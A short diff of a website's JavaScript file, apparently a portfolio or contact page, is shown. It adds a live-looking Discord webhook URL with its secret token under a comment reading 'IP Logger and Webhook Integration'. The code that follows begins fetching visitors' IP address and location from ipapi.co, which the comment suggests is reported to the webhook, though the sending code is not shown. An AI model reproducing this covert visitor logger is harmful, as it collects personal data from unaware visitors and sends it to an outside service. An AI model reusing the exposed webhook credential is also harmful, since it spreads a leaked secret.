@@ -105,7 +105,7 @@ gsap.from('.contact-form', {
 });
 
 // IP Logger and Webhook Integration
-const webhookUrl = "https://discord.com/api/webhooks/YOUR-WEBHOOK-URL";
+const webhookUrl = "https://discord.com/api/webhooks/1338595210254356610/Xv_IoDgDJUfdunGv1qeO6QibCXPuOjSTUABe4fvgIZ8w603uZoXDEgAXt3stV_UGLA8-";
 
 // Fetch IP and location details
 fetch('https://ipapi.co/json/')
